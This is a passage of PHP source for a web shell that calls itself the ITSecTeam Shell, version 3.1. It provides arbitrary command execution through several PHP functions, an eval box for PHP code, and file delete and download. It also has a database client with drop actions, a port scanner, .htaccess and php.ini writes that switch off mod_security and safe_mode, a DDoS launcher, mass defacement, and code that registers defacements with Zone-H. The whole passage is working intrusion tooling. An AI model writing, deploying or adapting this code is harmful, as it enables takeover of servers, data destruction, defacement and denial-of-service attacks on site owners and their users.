	}
	function Exec($command){
		if(@function_exists("exec")){
			@exec($command,$res);
			$res=join("\n",$res);
			return $res;
		}else{
			return false;
		}
	}
	function System($command){
		if(@function_exists("system")){
			ob_start();
			@system($command);
			$res=ob_get_contents();
			ob_end_clean();
			return $res;
		}else{
			return false;
		}
	}
	function Shell_Exec($command){
		if(!$res=@shell_exec($command)) return false;
		return $res;
	}
	function Proc_Open($command){
		$dep[]=array('pipe','r');$dep[]=array('pipe','w');
		if($opproc=@proc_open($command,$dep,$pipes)){
			while(!feof($pipes[1])){
				//$line=fgets($pipes[1]);
				$res.=fgets($pipes[1]);
			}
			proc_close($opproc);
			return $res;
		}else{
			return false;
		}
	}
	function Popen($command){
		if(is_resource($opopen = @popen($command,"r"))){
			while(!feof($opopen)) {
				$res=$res.fread($opopen,1024); 
			}
			pclose($opopen);
			return $res;
		}else{
			return false;
		}
	}
}
$CMD= new Execute();
$THEME = new Theme();
$FILEMANAGER = new FileManager();
//++++++++++++++++++++ Function List +++++++++++++++++++++
$DirCount=0;
$FileCount=0;
function Split_Address($address){
	global $slash;
	if (empty($address)){
		$address = realpath(".");
	}elseif(realpath($address)){
		$address = realpath($address);
	}
	if (substr($address,strlen($address)-1,1) != $slash){
		$address .= $slash;
	}
	$pd = $e = explode($slash,substr($address,0,strlen($address)-1));
	$i = 0;
	foreach($pd as $b)
	{
		$t = "";
		reset($e);
		$j = 0;
		foreach ($e as $r)
		{
			$t.= $r.$slash;
			if ($j == $i){break;}
			$j++;
		}
		$returnAddress.= '<a href="?address='.$t.'">'.$b.$slash.'</b></a>';
		$i++;
	}
	return $returnAddress;

}
function calc_size($size){
	//Calculate File Size To KB MB GB
	if($size >= 1073741824) {$size = @round($size / 1073741824 * 100) / 100 . " GB";}
	elseif($size >= 1048576) {$size = @round($size / 1048576 * 100) / 100 . " MB";}
	elseif($size >= 1024) {$size = @round($size / 1024 * 100) / 100 . " KB";}
	else {$size = $size . " B";}
	return $size;
}
	function ListDir($address,$limit,$type){
	global $DirCount,$FileCount;
		global $THEME,$cwd,$slash;
		$baseHandle=opendir($address);
		$counterColor1=0;
		if (dirCounter($address)%2){
			$counterColor2=1;
		}else{
			$counterColor2=0;
		}
		while (false !== ($tmpList = readdir($baseHandle))) {
			if ($tmpList != "." && $tmpList != "..") {
				if (filetype($tmpList)=="dir"){
					//Dir List
					$DirCount++;
					if ($counterColor1 %2){
						$color='"#e7e3de"';
					}else{
						$color='"#e2dfdd"';
					}
					$counterColor1++;
					if($type=="move"){
						$dirList.=$THEME->Move($cwd.$slash,$tmpList,$color);
					}elseif($type=="copy"){
						$dirList.=$THEME->Copy($cwd.$slash,$tmpList,$color);
					}elseif($type=="copydir"){
						$dirList.=$THEME->CopyDir($cwd.$slash,$tmpList,$color);
					}elseif($type=="movedir"){
						$dirList.=$THEME->MoveDir($cwd.$slash,$tmpList,$color);
					}else{
						$dirList.=$THEME->Dir($cwd.$slash,$tmpList,$color);
					}
				}else{
					//File List
					$FileCount++;
					if ($counterColor2 %2){
						$color='"#e7e3de"';
					}else{
						$color='"#e2dfdd"';
					}
					$counterColor2++;
					$fileList.=$THEME->File($cwd.$slash,$tmpList,$color);
				}
			}
		}
		if($limit=="dir"){
			$arrayList=array('dir'=>$dirList);
		}elseif($limit=="file"){
			$arrayList=array('file'=>$fileList);
		}else{
			$arrayList=array('file'=>$fileList,'dir'=>$dirList);
		}
		return $arrayList;
	}
	function ListDrive($address){
		global $THEME,$cwd,$slash;
		foreach (range("A","Z") as $tempdrive) {
			if (is_dir($tempdrive.":".$slash)){
			$driveName=$tempdrive.":".$slash;
			if ($counterColor1 %2){
				$color='"#e7e3de"';
			}else{
				$color='"#e2dfdd"';
			}
			$counterColor1++;
			$dirList.=$THEME->Dir($driveName.$slash,$driveName,$color);
			}
		}
		$arrayList=array('file'=>$fileList,'dir'=>$dirList);
		return $arrayList;
	}
function Read_File($address){
	if ($fp = @fopen($address, "r")){
		while (!feof($fp)){
			$source.=fread($fp, 65536);
		}
		fclose($fp); 
		return $source;
	}else{
		return false;
	}
}
function printdrive(){
	//Return Drive List
	global $slash;
	foreach (range("A","Z") as $tempdrive) {
		if (is_dir($tempdrive.":".$slash)){
		$driveName=$tempdrive.":".$slash;
		$listDrive=$listDrive.'<a href="?address='.$driveName.'"><font size=1>'.$tempdrive.':'.$slash.' </a></font>';
		}
	}
	return $listDrive;
}
function get_files_from_folder($directory, $put_into) {
	//Return File And Dir List For Zip Class
	global $zipfile;
	if ($handle = opendir($directory)) {
		while (false !== ($file = readdir($handle))) {
			if (is_file($directory.$file)) {
				$fileContents = file_get_contents($directory.$file);
				$zipfile->add_file($fileContents, $put_into.$file);
			} elseif ($file != '.' and $file != '..' and is_dir($directory.$file)) {
				$zipfile->add_dir($put_into.$file.'/');
				get_files_from_folder($directory.$file.'/', $put_into.$file.'/');
			}
		}
	}
	closedir($handle);
}
function input_hidden($name,$value){
	//Insert Hidden TextBox Html
	return '<input type=hidden name="'.$name.'" value="'.$value.'">';
}
function Write_File($address,$source){
	//Write File
	if($file_open=@fopen($address,"w")){
		fwrite($file_open,$source);
		fclose($file_open);
		return true;
	}else{
		return false;
	}
}
function GetProcesses(){
	global $CMD;
	if(Is_Win){
		$res=$CMD->Check_All("tasklist");
		return $res;
	}else{
		$res=$CMD->Check_All("ps -aux");
		return $res;
	}
}
function drawImage($name){
	//Print Header Pic For Show Base64 Picture
	$images=array("dir"=>'R0lGODlhDgAOAPcAAP//////zP//mf//Zv//M///AP/M///MzP/Mmf/MZv/MM//MAP+Z//+ZzP+Zmf+ZZv+ZM/+ZAP9m//9mzP9mmf9mZv9mM/9mAP8z//8zzP8zmf8zZv8zM/8zAP8A//8AzP8Amf8AZv8AM/8AAMz//8z/zMz/mcz/Zsz/M8z/AMzM/8zMzMzMmczMZszMM8zMAMyZ/8yZzMyZmcyZZsyZM8yZAMxm/8xmzMxmmcxmZsxmM8xmAMwz/8wzzMwzmcwzZswzM8wzAMwA/8wAzMwAmcwAZswAM8wAAJn//5n/zJn/mZn/Zpn/M5n/AJnM/5nMzJnMmZnMZpnMM5nMAJmZ/5mZzJmZmZmZZpmZM5mZAJlm/5lmzJlmmZlmZplmM5lmAJkz/5kzzJkzmZkzZpkzM5kzAJkA/5kAzJkAmZkAZpkAM5kAAGb//2b/zGb/mWb/Zmb/M2b/AGbM/2bMzGbMmWbMZmbMM2bMAGaZ/2aZzGaZmWaZZmaZM2aZAGZm/2ZmzGZmmWZmZmZmM2ZmAGYz/2YzzGYzmWYzZmYzM2YzAGYA/2YAzGYAmWYAZmYAM2YAADP//zP/zDP/mTP/ZjP/MzP/ADPM/zPMzDPMmTPMZjPMMzPMADOZ/zOZzDOZmTOZZjOZMzOZADNm/zNmzDNmmTNmZjNmMzNmADMz/zMzzDMzmTMzZjMzMzMzADMA/zMAzDMAmTMAZjMAMzMAAAD//wD/zAD/mQD/ZgD/MwD/AADM/wDMzADMmQDMZgDMMwDMAACZ/wCZzACZmQCZZgCZMwCZAABm/wBmzABmmQBmZgBmMwBmAAAz/wAzzAAzmQAzZgAzMwAzAAAA/wAAzAAAmQAAZgAAMwAAAJ3B1o+2zFyHoE15kUBrhD9qgzVieyAvODVjfDRgeTNedj1nfz9rg0Fme1J8lSAwOU1yh12IoWKMo12DmG+asnSetWySqHGWq4Ksw4u2z3uht4+50YmxyIOovY20ypa9053E2pvA1ZO2ypq4yk14jx0tNX+mu////yH5BAEAAP8ALAAAAAAOAA4AAAiAAP8JHEiwoMGDCBHiW5jwX7yH8RLuy0axYjZ78ezZo7fPCraP2PLdGzmv5Dx57vTZU0mvZT168PzBc/evXj1/OOW1a8euJ7t1/94JdaeuqLp02pKi+8fPnNOn26JGLfdvHLluWLuR48aVWzeB4sB5G0uWbDiB/c59W8t2rdp/AQEAOw=='
	,"file"=>'iVBORw0KGgoAAAANSUhEUgAAAA0AAAANCAYAAABy6+R8AAABaElEQVR42mMIXfWfef7JT7Yrz34o33ABhj9BaKDYrP3PE6IqpgkyoINNFz9Gnnzw/f/NFz8w8JYrX//P2H6zMrByijCKpl1XPkbee/Xt//fv3zHw/ltf/x+4/vnT7O036wOzkTSuP/cu8sazz/+/fPmCgS8++vx/25XP/xcceP4xr2dLPFA5M1jTytPvIq88/vj/40fc+Oz15//LOxZXAZVzgDUtO/E68tLDD/8/fMCB33/4f/rqs/8lLQur4ZoWH3sdeeH+h//v37/Hjt+9/3/yytP/RU1ImuYefh159u67/2/fvsWK37x58//4pSf/C9A1nb7z9v/r169x4mOXHv/PQ9a0AOi8M3cgJmLDIE0nLj9Bdd6CYy8iz94BKniNBb+B0CdBmpADonP9/cjlBx7/333q8f89p9HwGaA4kF665/7/lGqkIHfwKRax9Yh1t3IICLZ1CApBx1ZAbGIbECwlr28IVM4KAPZgwQxbJyVoAAAAAElFTkSuQmCC'
	,"back"=>'R0lGODlhFAAUAPcAAP//////zP//mf//Zv//M///AP/M///MzP/Mmf/MZv/MM//MAP+Z//+ZzP+Zmf+ZZv+ZM/+ZAP9m//9mzP9mmf9mZv9mM/9mAP8z//8zzP8zmf8zZv8zM/8zAP8A//8AzP8Amf8AZv8AM/8AAMz//8z/zMz/mcz/Zsz/M8z/AMzM/8zMzMzMmczMZszMM8zMAMyZ/8yZzMyZmcyZZsyZM8yZAMxm/8xmzMxmmcxmZsxmM8xmAMwz/8wzzMwzmcwzZswzM8wzAMwA/8wAzMwAmcwAZswAM8wAAJn//5n/zJn/mZn/Zpn/M5n/AJnM/5nMzJnMmZnMZpnMM5nMAJmZ/5mZzJmZmZmZZpmZM5mZAJlm/5lmzJlmmZlmZplmM5lmAJkz/5kzzJkzmZkzZpkzM5kzAJkA/5kAzJkAmZkAZpkAM5kAAGb//2b/zGb/mWb/Zmb/M2b/AGbM/2bMzGbMmWbMZmbMM2bMAGaZ/2aZzGaZmWaZZmaZM2aZAGZm/2ZmzGZmmWZmZmZmM2ZmAGYz/2YzzGYzmWYzZmYzM2YzAGYA/2YAzGYAmWYAZmYAM2YAADP//zP/zDP/mTP/ZjP/MzP/ADPM/zPMzDPMmTPMZjPMMzPMADOZ/zOZzDOZmTOZZjOZMzOZADNm/zNmzDNmmTNmZjNmMzNmADMz/zMzzDMzmTMzZjMzMzMzADMA/zMAzDMAmTMAZjMAMzMAAAD//wD/zAD/mQD/ZgD/MwD/AADM/wDMzADMmQDMZgDMMwDMAACZ/wCZzACZmQCZZgCZMwCZAABm/wBmzABmmQBmZgBmMwBmAAAz/wAzzAAzmQAzZgAzMwAzAAAA/wAAzAAAmQAAZgAAMwAAAFGhzVSl0lSk0Vmo1lyq1Way3G654kKTu0OUvESUvEaXwEqbxkiZwUydx0qawk2dyFKizVSkz1akzF6s1mOv12q13Gm02nO94yt9ojCCpzGDqTWHrTaHrjaHrTeHqzuMsjqKrj+Qt0mZv12pzWOv06Sjo6Ojo////yH5BAEAAP8ALAAAAAAUABQAAAiWAP8JHEiwoEGD79YdXPjvXTd12BgadLcN27l9Ege2W4cNWzlz6s7lUceQX7pz48zpE5ev5T18evQdLEdOHEuX9ObZixcP38Fw33Dak8cTntF4B+/dyznQqFFk8JAalEe0IDyoRhdmteoUnlavXLdmbOp0LEFSYs3+K6t2Ldq2a9NmNGqPYb+7eK3o0WPFH96DeAMLJhgQADs=');
	header("Content-type: image/gif");
	header("Cache-control: public");
	header("Expires: ".date("r",mktime(0,0,0,1,1,2030)));
	header("Cache-control: max-age=".(60*60*24*7));
	header("Last-Modified: ".date("r",filemtime(__FILE__)));
	echo base64_decode($images[$name]);
}
function Check_Function($funcName){
	//Check Function
	global $disableFunctionList;
	if (@in_array($funcName,$disableFunctionList)){
		alert("Function Disable!");
		return false;
	}elseif(!@function_exists($funcName)){
		alert("Function Not Exist!");
		return false;
	}else{
		return true;
	}
}
function sqlclienT(){
	//Echo Database Stuff
	global $t,$errorbox,$et,$hcwd;
	if(!empty($_REQUEST['serveR']) && !empty($_REQUEST['useR']) && isset($_REQUEST['pasS']) && !empty($_REQUEST['querY'])){
	$server=$_REQUEST['serveR'];$type=$_REQUEST['typE'];$pass=$_REQUEST['pasS'];$user=$_REQUEST['useR'];$query=$_REQUEST['querY'];
	$db=(empty($_REQUEST['dB']))?'':$_REQUEST['dB'];
	$_SESSION[server]=$_REQUEST['serveR'];$_SESSION[type]=$_REQUEST['typE'];$_SESSION[pass]=$_REQUEST['pasS'];$_SESSION[user]=$_REQUEST['useR'];
	}
	if (isset ($_GET[select_db])){
		$getdb=$_GET[select_db];
		$_SESSION[db]=$getdb;
		$query="SHOW TABLES";
		$res=querY($_SESSION[type],$_SESSION[server],$_SESSION[user],$_SESSION[pass],$_SESSION[db],$query);
	}
	elseif (isset ($_GET[select_tbl])){
		$tbl=$_GET[select_tbl];
		$_SESSION[tbl]=$tbl;
		$query="SELECT * FROM `$tbl`";
		$res=querY($_SESSION[type],$_SESSION[server],$_SESSION[user],$_SESSION[pass],$_SESSION[db],$query);
	}
	elseif (isset ($_GET[drop_db])){
		$getdb=$_GET[drop_db];
		$_SESSION[db]=$getdb;
		$query="DROP DATABASE `$getdb`";
		querY($_SESSION[type],$_SESSION[server],$_SESSION[user],$_SESSION[pass],'',$query);
		$res=querY($_SESSION[type],$_SESSION[server],$_SESSION[user],$_SESSION[pass],'','SHOW DATABASES');
	}
	elseif (isset ($_GET[drop_tbl])){
		$getbl=$_GET[drop_tbl];
		$query="DROP TABLE `$getbl`";
		querY($_SESSION[type],$_SESSION[server],$_SESSION[user],$_SESSION[pass],$_SESSION[db],$query);
		$res=querY($_SESSION[type],$_SESSION[server],$_SESSION[user],$_SESSION[pass],$_SESSION[db],'SHOW TABLES');
	}
	elseif (isset ($_GET[drop_row])){
		$getrow=$_GET[drop_row];
		$getclm=$_GET[clm];
		$query="DELETE FROM `$_SESSION[tbl]` WHERE $getclm='$getrow'";
		$tbl=$_SESSION[tbl];
		querY($_SESSION[type],$_SESSION[server],$_SESSION[user],$_SESSION[pass],$_SESSION[db],$query);
		$res=querY($_SESSION[type],$_SESSION[server],$_SESSION[user],$_SESSION[pass],$_SESSION[db],"SELECT * FROM `$tbl`");
	}
	else
		$res=querY($type,$server,$user,$pass,$db,$query);

	if($res){
		$res=htmlspecialchars($res);
		$row=array ();
		$title=explode('[+][+][+]',$res);
		$trow=explode('[-][-][-]',$title[1]);
		$row=explode('|+|+|+|+|+|',$title[0]);
		$data=array();
		$field=$trow[count($trow)-2];
		if (strstr($trow[0],'Database')!='')
			$obj='db';
		elseif (substr($trow[0],0,6)=='Tables')
			$obj='tbl';
		else
			$obj='row';
		$i=0;
		foreach ($row as $a){
			if($a!='')
				$data[$i++]=explode('|-|-|-|-|-|',$a);
		}
		echo "<table border=1 bordercolor='#C6C6C6' cellpadding='2' bgcolor='EAEAEA' width='100%' style='border-collapse: collapse'><tr>";
		foreach ($trow as $ti)
			echo "<td bgcolor='F2F2F2'>$ti</td>";
		echo "</tr>";
		$j=0;
		while ($data[$j]){
			echo "<tr>";
			foreach ($data[$j++] as $dr){
				echo "<td>";
				if($obj!='row') echo "<a href='$_SERVER[PHP_SELF]?do=db&select_$obj=$dr'>";
				echo $dr;
				if($obj!='row') echo "</a>";
				echo "</td>";
			}
			echo "<td><a href='$_SERVER[PHP_SELF]?do=db&drop_$obj=$dr";
			if($obj=='row')
				echo "&clm=$field";
			echo "'>Drop</a></td></tr>";
		}
		echo "</table><br>";
	}
	if(empty($_REQUEST['typE']))$_REQUEST['typE']='';
	echo "<center><form name=client method='POST' action='$_SERVER[PHP_SELF]?do=db'><table border='1' width='400' style='border-collapse: collapse' id='table1' bordercolor='#C6C6C6' cellpadding='2'><tr><td width='400' colspan='2' bgcolor='#F2F2F2'><p align='center'><b><font face='Arial' size='2' color='#433934'>Connect to Database</font></b></td></tr><tr><td width='150' bgcolor='#EAEAEA'><font face='Arial' size='2'>DB Type:</font></td><td width='250' bgcolor='#EAEAEA'><select name=typE><option valut=MySQL  onClick='document.client.serveR.disabled = false;' ";
	if ($_REQUEST['typE']=='MySQL')echo 'selected';
	echo ">MySQL</option><option valut=MSSQL onClick='document.client.serveR.disabled = false;' ";
	if ($_REQUEST['typE']=='MSSQL')echo 'selected';
	echo ">MSSQL</option><option valut=Oracle onClick='document.client.serveR.disabled = true;' ";
	if ($_REQUEST['typE']=='Oracle')echo 'selected';
	echo ">Oracle</option><option valut=PostgreSQL onClick='document.client.serveR.disabled = false;' ";
	if ($_REQUEST['typE']=='PostgreSQL')echo 'selected';
	echo ">PostgreSQL</option><option valut=DB2 onClick='document.client.serveR.disabled = false;' ";
	if ($_REQUEST['typE']=='DB2')echo 'selected';
	echo ">IBM DB2</option></select></td></tr><tr><td width='150' bgcolor='#EAEAEA'><font face='Arial' size='2'>Server Address:</font></td><td width='250' bgcolor='#EAEAEA'><input type=text value='";
	if (!empty($_REQUEST['serveR'])) echo htmlspecialchars($_REQUEST['serveR']);else echo 'localhost'; 
	echo "' name=serveR size=35></td></tr><tr><td width='150' bgcolor='#EAEAEA'><font face='Arial' size='2'>Username:</font></td><td width='250' bgcolor='#EAEAEA'><input type=text name=useR value='";
	if (!empty($_REQUEST['useR'])) echo htmlspecialchars($_REQUEST['useR']);else echo 'root'; 
	echo "' size=35></td></tr><tr><td width='150' bgcolor='#EAEAEA'><font face='Arial' size='2'>Password:</font></td><td width='250' bgcolor='#EAEAEA'><input type=text value='";
	if (isset($_REQUEST['pasS'])) echo htmlspecialchars($_REQUEST['pasS']);else echo '123'; 
	echo "' name=pasS size=35></td></tr><tr><td width='400' colspan='2' bgcolor='#F2F2F2'><p align='center'><b><font face='Arial' size='2' color='#433934'>Submit a Query</font></b></td></tr><tr><td width='150' bgcolor='#EAEAEA'><font face='Arial' size='2'>DB Name:</font></td><td width='250' bgcolor='#EAEAEA'><input type=text value='";
	if (!empty($_REQUEST['dB'])) echo htmlspecialchars($_REQUEST['dB']); 
	echo "' name=dB size=35></td></tr><tr><td width='150' bgcolor='#EAEAEA'><font face='Arial' size='2'>Query:</font></td><td width='250' bgcolor='#EAEAEA'><textarea name=querY rows=5 cols=27>";
	if (!empty($_REQUEST['querY'])) echo htmlspecialchars(($_REQUEST['querY']));else echo 'SHOW DATABASES'; 
	echo "</textarea></td></tr><tr><td width='400' colspan='2' bgcolor='#EAEAEA'>$hcwd<input class=buttons type=submit value='Submit' style='float: right'></td></tr></table></form>$et</center>";
}
function querY($type,$host,$user,$pass,$db='',$query){
	//Execute Query
	$res='';
	switch($type){
		case 'MySQL':
			if(!function_exists('mysql_connect'))return 0;
			$link=mysql_connect($host,$user,$pass);
			if($link){
				if(!empty($db))mysql_select_db($db,$link);
				$result=mysql_query($query,$link);
				if ($result!=1){
					while($data=mysql_fetch_row($result))$res.=implode('|-|-|-|-|-|',$data).'|+|+|+|+|+|';
					$res.='[+][+][+]';
					for($i=0;$i<mysql_num_fields($result);$i++)
						$res.=mysql_field_name($result,$i).'[-][-][-]';
				}
				mysql_close($link);
				return $res;
			}
			break;
		case 'MSSQL':
			if(!function_exists('mssql_connect'))return 0;
			$link=mssql_connect($host,$user,$pass);
			if($link){
				if(!empty($db))mssql_select_db($db,$link);
				$result=mssql_query($query,$link);
				while($data=mssql_fetch_row($result))$res.=implode('|-|-|-|-|-|',$data).'|+|+|+|+|+|';
				$res.='[+][+][+]';
				for($i=0;$i<mssql_num_fields($result);$i++)
					$res.=mssql_field_name($result,$i).'[-][-][-]';
				mssql_close($link);
				return $res;
			}
			break;
		case 'Oracle':
			if(!function_exists('ocilogon'))return 0;
			$link=ocilogon($user,$pass,$db);
			if($link){
				$stm=ociparse($link,$query);
				ociexecute($stm,OCI_DEFAULT);
				while($data=ocifetchinto($stm,$data,OCI_ASSOC+OCI_RETURN_NULLS))$res.=implode('|-|-|-|-|-|',$data).'|+|+|+|+|+|';
				$res.='[+][+][+]';
				for($i=0;$i<oci_num_fields($stm);$i++)
				$res.=oci_field_name($stm,$i).'[-][-][-]';
				return $res;
			}
			break;
		case 'PostgreSQL':
			if(!function_exists('pg_connect'))return 0;
			$link=pg_connect("host=$host dbname=$db user=$user password=$pass");
			if($link){
				$result=pg_query($link,$query);
				while($data=pg_fetch_row($result))$res.=implode('|-|-|-|-|-|',$data).'|+|+|+|+|+|';
				$res.='[+][+][+]';
				for($i=0;$i<pg_num_fields($result);$i++)
				$res.=pg_field_name($result,$i).'[-][-][-]';
				pg_close($link);
				return $res;
			}
			break;
		case 'DB2':
			if(!function_exists('db2_connect'))return 0;
			$link=db2_connect($db,$user,$pass);
			if($link){
				$result=db2_exec($link,$query);
				while($data=db2_fetch_row($result))$res.=implode('|-|-|-|-|-|',$data).'|+|+|+|+|+|';
				$res.='[+][+][+]';
				for($i=0;$i<db2_num_fields($result);$i++)
				$res.=db2_field_name($result,$i).'[-][-][-]';
				db2_close($link);
				return $res;
			}
			break;
	}
	return 0;
}
function alert($text){
	//Show Java Script Error
	echo "<script>alert('".$text."')</script>";
}
function check_error($res,$msg){
	//Check Return Function For Error
	if ($res==null){
		alert('Permission Denied !');
	}else{
		alert("$msg Successful !");
	}
}
function Get_Checkbox($postList){
	//Return All CheckBox Checked Data From Post
	$returnArray=array();
	foreach ($postList['checked'] as $postTmp){
			array_push($returnArray,$postTmp);
	}
	return $returnArray;
}
function dirCounter($address){
	//Return Dir Count For Fix Problem Odd Or Even File List
	$baseHandle=opendir($address);
	while (false !== ($fileee = readdir($baseHandle))) {
		if ($fileee != "." && $fileee != "..") {
			if (filetype($fileee)=="dir"){
				$counter++;
			}
		}
	}
	return $counter;
}
function Zone_H($url,$name){
	//Register A Domain In zone_h.org
	if(check_function(curl_init)){
		$ch = curl_init("http://zone-h.org/notify/single");
		curl_setopt($ch, CURLOPT_POST      ,1);
		curl_setopt($ch, CURLOPT_POSTFIELDS    ,"defacer=$name&domain1=$url&hackmode=1&reason=3");
		curl_setopt($ch, CURLOPT_FOLLOWLOCATION  ,1); 
		curl_setopt($ch, CURLOPT_HEADER      ,0);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER  ,1);
		$Rec_Data = curl_exec($ch);
		if (strpos($Rec_Data,"OK")>=1){
			alert("Deface Registerd!");
		}
	}
	sleep(1);
}
function PortScanner($portNum1,$postNum2,$ipAddress){
	//Port Scanner
	$arrayPorts=array();
	for($portCounter=intval($portNum1);$portCounter<=intval($postNum2);$portCounter++){
		$sockPort = @fsockopen($ipAddress, $portCounter, $errno, $errstr, 1);
		if($sockPort){
			array_push($arrayPorts,"Port $portCounter is open");
		}
	}
	return $arrayPorts;
}
//-------------------- Function List ---------------------
switch($_REQUEST['do']){
	case 'image':
		//Show Image From Base64
		if(!empty($_GET['img'])){
			drawImage($_GET['img']);
		}
		break;
	case 'remove':
		//Remove MySelf
		$FILEMANAGER->remove_file(getcwd().$slash.$_SERVER["SCRIPT_NAME"]);
		break;
	case 'eval':
		//Execute Php Source Code
		if (!empty($_POST['evalsource'])){
			eval($_POST['evalsource']);
		}
		echo $THEME->Main(input_hidden("do","eval").'<b><<<< Execute Php Code >>>></b><hr><p align=center><textarea rows="19" name="evalsource" cols="87"></textarea><br><input type=submit value="eXecute">',"post");exit;
		break;
	case 'about':
		//About Me
		echo $THEME->Main("<b></p></font><center><font color=red>ITSecTeam, IT Security Research & Penetration Testing Team</b></font><br>Version 3.1 <br>Last Update : 2010/10/10<br>Coded By : Amin Shokohi(Pejvak)<br>Special Thanks(M3hr@n.S , Am!rkh@n)<br>Home Page : <a href='http://www.itsecteam.com'>http://www.itsecteam.com</a><br>Update Notice: <a href='http://itsecteam.com/en/projects/itsecteam_shell.htm'>ITSecTeam Shell</a><br>Forum : <a href='http://www.forum.itsecteam.com'>http://www.forum.itsecteam.com</a><br>".$itsec,"");exit;
		break;
	case 'rename':
		//Rename File
		if (!empty($_POST['oldfilename']) && !empty($_POST['newfilename'])){
			check_error($FILEMANAGER->Rename($_POST['oldfilename'],$_POST['newfilename']),"Rename");
			break;
		}
		echo $THEME->Main(input_hidden("do","rename").'<b><<<< Rename File >>>></b><hr><p align=center><input value="'.$_GET['name'].'"><input type=hidden name=oldfilename value="'.$_GET['address'].$_GET['name'].'"> To <input name=newfilename><br><input type=submit value="  Save  "></form></p>',"post");exit;
		break;
	case 'server':
		//Bypass Server Config
		switch($_POST['byserver']){
			case 'offmodes':
				Write_File(getcwd().$slash.".htaccess",'<IfModule mod_security.c>
				Sec------Engine Off
				Sec------ScanPOST Off
				</IfModule>');
				break;
			case 'bysymlink':
				Write_File(getcwd().$slash.".htaccess",'Options +FollowSymLinks
				DirectoryIndex Persian-Gulf-For-Ever.html');
				break;
			case 'bysafeandfunc':
				Write_File(getcwd().$slash."php.ini",'safe_mode=OFF
				disable_functions=NONE');
				break;
		}
		echo $THEME->Main(input_hidden("do","server").'<b><<<< Server Bypass >>>></b><hr><p align=center><select name=byserver><option value="offmodes">Off Mode Security(.htaccess)</option><option value="bysymlink">Bypass Symlink(.htaccess)</option><option value="bysafeandfunc">Disable Safe Mode & Disable Function(Php.ini)</option></select><br><input type=submit value=eXecute>',"post");exit;
		break;
	case 'dd0s':
		//DD0s
		if ($_POST['ipaddress']){
			$DD0S=new DD0S();
			$DD0S->D0s_Remote($_POST['ipaddress'],$_POST['time']);
		}
		echo $THEME->Main(input_hidden("do","dd0s").'<b><<<< DD0S Remote Server >>>></b><hr><p align=center>Address : <input name=ipaddress size=50> Time : <input name=time size=6 value=40000><br><input type=submit value="  DDoS  ">','post');exit;
		break;
	case 'dlfile':
		//Download File
		if ($_POST['dladdress']){
			$FILEMANAGER->Download_Remote($_POST['dladdress'],$_POST['saveaddress']);
		}
		echo $THEME->Main(input_hidden("do","dlfile").'<b><<<< Download Remote File >>>></b><hr><p align=center>Address : <input name=dladdress size=70><br>Save To : <input name=saveaddress value='.getcwd().$slash.' size=70><br><input type=submit value="  Download  ">','post');exit;
		break;
	case 'perm':
		//Find All Writeable Dir
		if ($_GET['diraddress']){
			$arrfilelist=$FILEMANAGER->FindPermDir($_GET['diraddress']);
			if ($arrfilelist=='notfound'){
				alert("Not Found !");
			}elseif($arrfilelist=='notperm'){
				alert("Permission Denied !");
			}else{
				foreach ($arrfilelist as $tmpdir){
					if ($coi %2){
						$color='"#e7e3de"';
					}else{
						$color='"#e4e1de"';
					}
					$coi++;
					$permdir.=$THEME->Dir($tmpdir['diraddress'],$tmpdir['dirname'],$color);
				}
			}
			echo $THEME->Main($permdir,"");exit;
		}
		echo $THEME->Main(input_hidden("do","perm").'<b><<<< Find All Writeable Dir >>>></b><hr><p align=center><input name=diraddress value="'.getcwd().$slash.'" size=50><br><input type=submit value="  Search  ">','get');exit;
		break;
	case 'mass':
		//MassDef4ce
		if ($_POST['massaddress'] && $_POST['pagename'] && $_POST['pagesource']){
			check_error($FILEMANAGER->MassDef($_POST['massaddress'],$_POST['pagename'],$_POST['pagesource']),"Mass Deface");
		}
		echo $THEME->Main(input_hidden("do","mass").'<b><<<< Mass Deface >>>></b><hr><p align=center><input name=massaddress value="'.getcwd().$slash.'" size=65><input name=pagename value="def.htm" size=10><br><textarea name=pagesource cols=60 rows=18>Source</textarea><br><input type=submit value="  Mass  "',"post");exit;
		break;
	case 'down':
		//Download File
		if ($_GET['type']=='file'){
			$FILEMANAGER->Download_File($_GET['address'],$_GET['filename']);}
		elseif($_GET['type']=='dir'){
			$addressDir=$_GET['address'].$slash.$_GET['dirname'].$slash;
			$zipfile = new zipfile();
			$dlTime=date("y-m-d");
			get_files_from_folder($addressDir,'');
			header("Content-Disposition: attachment; filename=" . $_GET['dirname']."-".$dlTime.".zip");   
			header("Content-Type: application/download");
			header("Content-Length: " . strlen($zipfile -> file()));
			flush();
			echo $zipfile -> file(); 
			$filename = $_GET['dirname2'].$_GET['dirname']."-".$dlTime.".zip";
			$fd = fopen ($filename, "wb");
			fwrite ($fd, $zipfile -> file());
			fclose ($fd);
		}
		break;
	case 'delete':
		//Delete Fild And Dir
		if ($_GET['type']=="dir"){
			$addressDir=$_GET['address'].$_GET['dirname'];
			check_error($FILEMANAGER->Delete_Dir($addressDir),"Directory Deleted");
		}elseif($_GET['type']=="file"){
			$addressFile=$_GET['address'].$_GET['filename'];
			check_error($FILEMANAGER->Remove_File($addressFile),"File Deleted");
		}
		break;
	case 'info':
		//Server Information
		if(ini_get('register_globals')){
			$registerGlobalStatus="Enable";
		}else{
			$registerGlobalStatus="disable";
		}
		if(extension_loaded('curl')){
			$curlStatus="Enable";
		}else{
			$curlStatus="disable";
		}
		if(@function_exists('mysql_connect')){
			$dbStatus=$dbStatus."Mysql ";
		};
		if(@function_exists('mssql_connect')){
			$dbStatus=$dbStatus."Mssql ";
		};
		if(@function_exists('pg_connect')){
			$dbStatus=$dbStatus."PostgreSQL ";
		};
		if(@function_exists('ocilogon')){
			$dbStatus=$dbStatus."Oracle ";
		};
		echo $THEME->Main("<b><<<< Server Information >>>></b><hr><p align=center></p><font face='Tahoma' size='2'><ul><li>Server : ".getenv("SERVER_SOFTWARE")."</li><br><li>Operating System : ".php_uname()."</li><br><li>Server Name : ".$_SERVER['HTTP_HOST']."</li><br><li>Disable_Functions : ".$disableFunctionList."</li><br><li>Safe_Mode : ".$safe_mode."</li><br><li>Openbase_dir : ".ini_get('openbase_dir')."</li><br><li>Username : ".get_current_user()."</li><br><li>Php Version : ".phpversion()."</li><br><li>Free Space : ".calc_size(disk_free_space("/"))."</li><br><li>Total Space : ".calc_size(disk_total_space("/"))."</li><br><li>Register_Globals : ".$registerGlobalStatus."</li><br><li>Maximum Upload Size : ".ini_get('upload_max_filesize')."</li><br><li>Maximum Execute Time : ".get_cfg_var('max_execution_time')." Second</li><br><li>Curl : ".$curlStatus."</li><br><li>Database Enable : ".$dbStatus."</li><br><li>Server Name : 